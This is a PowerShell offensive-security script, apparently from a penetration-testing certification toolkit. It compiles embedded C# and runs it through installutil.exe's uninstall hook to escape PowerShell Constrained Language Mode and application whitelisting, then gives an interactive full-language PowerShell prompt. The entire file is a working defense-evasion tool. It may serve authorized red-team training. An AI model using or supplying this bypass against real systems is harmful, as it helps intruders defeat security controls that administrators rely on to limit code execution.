# from https://github.com/tree-chtsec/osep-tools/blob/main/scripts/bypass_clm_installutil.ps1
function Invoke-Installutil{
    $csf = New-TemporaryFile;
    $dllf = New-TemporaryFile;
    Set-Content -Path $csf -Value @'
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PsBypassCLM
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string command = "";
            // checking for RevShell mode

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            // set execution policy to Unrestricted for current process
            // this should bypass costraint language mode from the low priv 'ConstrainedLanguage' to our beloved 'FullLanguage'
            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");


            // loop for getting commands from Stdin
            do
            {

                Console.Write("PS > ");
                command = Console.ReadLine();


                // vervbse check!
                if (!string.IsNullOrEmpty(command))
                {
                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        try
                        {

                            pipeline.Commands.AddScript(command);
                            pipeline.Commands.Add("Out-String");

                            // otherwise stay open and ready to accept and invoke commands
                            Collection<PSObject> results = pipeline.Invoke();
                            //var process = (Process)pipeline.Output.Read().BaseObject;

                            StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
                                stringBuilder.AppendLine(obj.ToString());
                            }
                            Console.Write(stringBuilder.ToString());
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            }
            while (command != "exit");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string[] args = new string[] { };
            PsBypassCLM.Program.Main(args);
        }
    }
}
'@.replace('%psraw%',$args)

    $liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
    c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$dllf $csf;
    c:\windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=true /U $dllf;
};
